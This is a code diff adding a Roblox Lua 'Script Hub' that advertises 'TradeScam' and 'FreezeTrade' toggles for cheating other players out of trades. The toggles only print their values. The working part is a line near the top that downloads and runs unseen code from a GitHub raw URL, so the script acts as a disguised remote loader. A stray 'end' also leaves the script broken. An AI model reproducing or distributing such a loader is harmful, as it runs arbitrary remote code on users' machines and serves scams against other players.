@@ -1,0 +1,31 @@
+getgenv().gui = false 
+ 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/NicoZHuB/D3AD-MM2-HUB/main/DeadMM2HUB"))()
+
+local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
+local Window = OrionLib:MakeWindow({Name = "SCRIPT HUB https://discord.com/invite/RZtsvvyt", HidePremium = false, IntroText = "Script Hub", SaveConfig = true, ConfigFolder = "OrionTest"})
+ 
+local TradeScamTab = Window:MakeTab({
+    Name = "TRADESCAM",
+    Icon = "rbxassetid://4483345998",
+    PremiumOnly = false
+})
+ 
+TradeScamTab:AddToggle({
+    Name = "TradeScam",
+    Default = false,
+    Callback = function(Value)
+        print(Value)
+    end
+})
+ 
+TradeScamTab:AddToggle({
+    Name = "FreezeTrade",
+    Default = false,
+    Callback = function(Value)
+        print(Value)
+    end
+})
+ 
+end
+OrionLib:Init()
